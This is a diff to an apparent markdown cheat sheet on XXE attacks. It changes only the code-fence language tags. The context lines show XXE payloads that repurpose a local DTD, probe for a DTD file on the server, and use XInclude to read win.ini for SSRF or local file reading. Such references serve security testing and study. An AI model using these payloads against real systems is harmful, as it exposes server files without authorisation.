@@ -923,7 +923,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ```
 - **Exploiting blind XXE by repurposing a local DTD**<br/>
   Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`
-  ```
+  ```dtd
   <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
   <!ENTITY % custom_entity '
@@ -937,7 +937,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ]>
   ```
   To locate the DTD file, submit the payload
-  ```xml
+  ```dtd
   <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM
   "file:///usr/share/yelp/dtd/docbookx.dtd">
@@ -945,7 +945,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ]>
   ```
 - **Try with xinclude to achieve SSRF or LFI**
-  ```XML
+  ```xml
   <?xml version="1.0" encoding="utf-8" ?>
   <username xmls:xi="https://w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///c:/windows/win.ini">
